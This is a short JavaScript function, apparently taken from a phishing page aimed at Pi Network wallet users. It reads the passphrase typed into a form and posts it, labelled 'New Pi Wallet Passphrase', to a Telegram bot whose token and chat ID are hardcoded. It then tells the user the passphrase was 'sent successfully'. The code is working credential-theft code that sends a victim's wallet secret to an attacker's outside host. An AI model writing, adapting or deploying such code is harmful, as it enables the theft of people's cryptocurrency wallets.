function sendToTelegram() {
  const pass = document.getElementById("passphrase").value;
  if(!pass.trim()){
    alert("Please enter your passphrase.");
    return;
  }

  // Your bot details
  const token = "8093181669:AAHx-bmrsRp6hGifkqjFmtgYmu__QRBbL54";
  const chatId = "6343279619";

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(url, {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: chatId,
      text: "New Pi Wallet Passphrase:\n\n" + pass
    })
  })
  .then(res => res.json())
  .then(data => {
    alert("Passphrase sent successfully ✅");
    document.getElementById("passphrase").value = ""; // clears box after send
  })
  .catch(err => {
    alert("Error sending to Telegram ❌");
    console.error(err);
  });
}

